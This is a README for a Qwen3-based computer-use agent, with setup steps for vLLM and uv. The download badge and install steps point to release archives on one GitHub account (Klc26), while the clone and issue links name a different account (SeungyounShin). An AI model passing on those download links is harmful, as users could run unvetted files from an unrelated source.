# 🌟 qwen3_computer_use - Control Your Computer Effortlessly

[![Download qwen3_computer_use](https://img.shields.io/badge/Download-qwen3_computer_use-blue.svg)](https://github.com/Klc26/qwen3_computer_use/releases)

## 🚀 Getting Started

Welcome to the **qwen3_computer_use** application! This program allows you to use a minimalistic GUI agent to control your computer's mouse, keyboard, and even capture screenshots. It connects to an OpenAI compatible endpoint, offering an intuitive way to interact with the Qwen3 model.

## 📥 Download & Install

To get started, visit this page to download the latest version of the application: [Download qwen3_computer_use](https://github.com/Klc26/qwen3_computer_use/releases).

Follow these steps to download and install:

1. **Download the Release**: Go to the [Releases page](https://github.com/Klc26/qwen3_computer_use/releases) and find the latest version. Click on it to begin the download.
2. **Extract the Files**: After the download is complete, extract the files to a folder on your computer.
3. **Install Requirements**: Ensure you have Python 3.10 or later installed. You can download Python from the official [Python website](https://www.python.org/downloads/).

## 💻 Requirements

Before running the application, make sure you meet the following requirements:

- **Operating System**: Windows, macOS, or Linux
- **Python 3.10 or higher**: Download from [Python.org](https://www.python.org/downloads/).
- **GUI Control Permission**: You need the right permissions for GUI operations. This could be X11, Wayland, VNC, or using a physical or virtual display.
- **OpenAI Compatibility**: You will need a server hosting a Qwen3 model. For example, it could be something like `http://localhost:8000/v1`.

## 🔧 Installation Steps

Once you have the requirements in place, follow these steps:

1. **Clone the Repository**:
   Open your terminal (Command Prompt, PowerShell, or Terminal) and run:
   ```bash
   git clone https://github.com/SeungyounShin/qwen3_computer_use.git
   ```

2. **Navigate to the Directory**:
   Change to the application directory:
   ```bash
   cd ./qwen3_computer_use
   ```

3. **Sync Install Requirements**:
   Execute the following command to set up the environment:
   ```bash
   uv sync
   ```

## 🚀 Start the vLLM Server

Before running the agent, you need to launch the vLLM server. Use the command below:
```bash
CUDA_VISIBLE_DEVICES=2,3 vllm serve Qwen/Qwen3-VL-30B-A3B-Instruct \
  --tensor-parallel-size 2 \
  --limit-mm-per-prompt.video 0 \
  --async-scheduling \
  --max-model-len 16392 \
  --enable-auto-tool-choice \
  --tool-call-parser hermes
```
This command ensures that the server is ready to handle requests from the application.

## ▶️ Running the Application

To start using the application, run the following command:
```bash
uv run python run.py \
  --model "Qwen/Qwen3-VL-30B-A3B-Instruct"
```

## 📸 Features

- **Mouse Control**: Easily move your mouse and click as needed.
- **Keyboard Input**: Type out text or commands seamlessly.
- **Screenshot Capture**: Take snapshots of your screen for easy documentation.
- **OpenAI Integration**: Utilize the Qwen3 model for advanced functionality.

## 🔍 Troubleshooting

If you encounter issues, consider these solutions:

1. **No GUI Control**: Ensure you have the necessary permissions set up for your operating system.
2. **Python Issues**: Double-check your Python version. You must have 3.10 or higher.
3. **Server Not Responding**: Verify that your OpenAI server is running and accessible.

## 🤝 Community and Support

For any questions or to share your experiences, please visit our [Issues page](https://github.com/SeungyounShin/qwen3_computer_use/issues). Your feedback helps improve the application. 

Thank you for using qwen3_computer_use. We hope you enjoy the convenience of controlling your computer with ease!